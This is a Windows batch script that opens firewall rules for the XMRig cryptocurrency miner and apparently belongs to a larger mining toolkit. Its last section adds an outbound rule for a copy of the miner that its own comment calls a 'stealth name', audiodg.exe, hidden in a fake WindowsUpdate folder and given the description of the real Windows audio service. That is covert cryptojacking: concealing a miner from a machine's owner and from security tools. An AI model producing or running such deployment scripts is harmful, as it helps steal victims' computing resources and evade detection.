@echo off
title ADD FIREWALL EXCEPTION FOR XMRIG
color 0A

echo ================================================================
echo  ADD WINDOWS FIREWALL EXCEPTION
echo  This allows XMRig to connect to mining pools
echo ================================================================
echo.
echo This will add firewall rules to allow xmrig.exe to:
echo  - Connect to mining pools (outbound)
echo  - Accept monitoring connections (inbound)
echo.
echo You MUST run this as Administrator!
echo.
pause

cd /d "%~dp0"

echo.
echo Adding firewall rules...
echo.

REM Add outbound rule (most important - allows connection to pool)
netsh advfirewall firewall add rule name="XMRig Miner - Outbound" dir=out action=allow program="%CD%\xmrig.exe" enable=yes description="Allow XMRig to connect to mining pools"

if %ERRORLEVEL%==0 (
    echo [OK] Outbound rule added
) else (
    echo [ERROR] Failed to add outbound rule
    echo Make sure you're running as Administrator!
    pause
    exit
)

REM Add inbound rule (for monitoring/API)
netsh advfirewall firewall add rule name="XMRig Miner - Inbound" dir=in action=allow program="%CD%\xmrig.exe" enable=yes description="Allow XMRig monitoring API"

if %ERRORLEVEL%==0 (
    echo [OK] Inbound rule added
) else (
    echo [WARN] Failed to add inbound rule (not critical)
)

REM Also add for audiodg.exe (stealth name)
if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe" (
    echo.
    echo Adding rule for deployed miner (audiodg.exe)...
    netsh advfirewall firewall add rule name="AudioDG - Outbound" dir=out action=allow program="C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe" enable=yes description="Allow audio device graph isolation"
    
    if %ERRORLEVEL%==0 (
        echo [OK] Deployed miner firewall rule added
    )
)

echo.
echo ================================================================
echo  FIREWALL EXCEPTIONS ADDED SUCCESSFULLY!
echo ================================================================
echo.
echo XMRig can now connect to mining pools.
echo.
echo Next steps:
echo  1. Run TEST_POOL_CONNECTION.bat to verify
echo  2. If test passes, run START_ULTIMATE_FIXED.bat
echo.
pause
